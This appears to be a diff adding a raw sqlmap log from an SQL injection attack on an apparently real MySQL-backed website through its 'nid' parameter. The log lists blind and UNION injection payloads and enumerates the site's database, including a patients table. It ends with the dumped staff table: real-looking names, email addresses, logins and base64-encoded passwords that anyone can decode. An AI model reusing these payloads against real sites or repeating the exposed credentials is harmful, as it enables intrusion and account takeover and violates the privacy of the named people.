@@ -1,0 +1,180 @@
+sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
+---
+Parameter: nid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: nid=35 AND 1694=1694
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: nid=35 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: nid=-9093 UNION ALL SELECT NULL,CONCAT(0x716b707171,0x77534b6c6f486c474654567247767a4d676970495248434c5a6d586f63786b5a7148586a69445856,0x7170627871),NULL,NULL,NULL,NULL,NULL,NULL-- fbhk
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] dipanariello
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: nid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: nid=35 AND 1694=1694
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: nid=35 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: nid=-9093 UNION ALL SELECT NULL,CONCAT(0x716b707171,0x77534b6c6f486c474654567247767a4d676970495248434c5a6d586f63786b5a7148586a69445856,0x7170627871),NULL,NULL,NULL,NULL,NULL,NULL-- fbhk
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: dipanariello
+[23 tables]
++-----------------------+
+| arquivos              |
+| atividades_circenses  |
+| bancos                |
+| cidades               |
+| depoimentos           |
+| estados               |
+| folder                |
+| funcionario_modulo    |
+| funcionarios          |
+| galeria_imagens       |
+| historico_acoes       |
+| indicacao             |
+| log_negativo          |
+| log_positivo          |
+| modulos               |
+| newsletter            |
+| noticias              |
+| pacientes             |
+| planos                |
+| tabela                |
+| tratamentos           |
+| tratamentos_pacientes |
+| videos                |
++-----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: nid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: nid=35 AND 1694=1694
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: nid=35 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: nid=-9093 UNION ALL SELECT NULL,CONCAT(0x716b707171,0x77534b6c6f486c474654567247767a4d676970495248434c5a6d586f63786b5a7148586a69445856,0x7170627871),NULL,NULL,NULL,NULL,NULL,NULL-- fbhk
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: dipanariello
+[23 tables]
++-----------------------+
+| arquivos              |
+| atividades_circenses  |
+| bancos                |
+| cidades               |
+| depoimentos           |
+| estados               |
+| folder                |
+| funcionario_modulo    |
+| funcionarios          |
+| galeria_imagens       |
+| historico_acoes       |
+| indicacao             |
+| log_negativo          |
+| log_positivo          |
+| modulos               |
+| newsletter            |
+| noticias              |
+| pacientes             |
+| planos                |
+| tabela                |
+| tratamentos           |
+| tratamentos_pacientes |
+| videos                |
++-----------------------+
+
+Database: dipanariello
++-----------------------+---------+
+| Table                 | Entries |
++-----------------------+---------+
+| cidades               | 9714    |
+| historico_acoes       | 645     |
+| log_positivo          | 575     |
+| arquivos              | 444     |
+| log_negativo          | 287     |
+| pacientes             | 105     |
+| tratamentos_pacientes | 43      |
+| funcionario_modulo    | 39      |
+| estados               | 27      |
+| noticias              | 20      |
+| depoimentos           | 15      |
+| atividades_circenses  | 14      |
+| modulos               | 11      |
+| videos                | 10      |
+| galeria_imagens       | 8       |
+| tratamentos           | 8       |
+| bancos                | 6       |
+| indicacao             | 5       |
+| planos                | 5       |
+| funcionarios          | 4       |
+| folder                | 1       |
+| tabela                | 1       |
++-----------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: nid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: nid=35 AND 1694=1694
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: nid=35 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: nid=-9093 UNION ALL SELECT NULL,CONCAT(0x716b707171,0x77534b6c6f486c474654567247767a4d676970495248434c5a6d586f63786b5a7148586a69445856,0x7170627871),NULL,NULL,NULL,NULL,NULL,NULL-- fbhk
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: dipanariello
+Table: funcionarios
+[4 entries]
++---------------+------------+--------------------------------+------------------+--------------------------+------------------+---------------+---------------+
+| id_funcio_fun | assinatura | ds_email_fun                   | ds_senha_fun     | ds_login_fun             | nm_funcio_fun    | fl_ativos_fun | fl_booker_fun |
++---------------+------------+--------------------------------+------------------+--------------------------+------------------+---------------+---------------+
+| 1             | <blank>    | marcos.bellini@gmail.com       | a2xhajg5         | bWFyY29zLmJlbGxpbmk=     | Marcos Bellini   | S             | N             |
+| 19            | <blank>    | contato@ericocavalheiro.com.br | MTIzbXVkYXI=     | ZXJpY28uY2F2YWxoZWlybw== | Erico            | S             | S             |
+| 22            | <blank>    | fabio@dipanariello.com.br      | MjAxMQ==         | ZmFiaW8uZGlwYW5hcmllbGxv | Fábio Panariello | S             | S             |
+| 24            | <blank>    | rafael@agenciasantafe.com.br   | dmNBdTduMVNZWA== | c2FudGFmZQ==             | Santa F          | S             | S             |
++---------------+------------+--------------------------------+------------------+--------------------------+------------------+---------------+---------------+
+
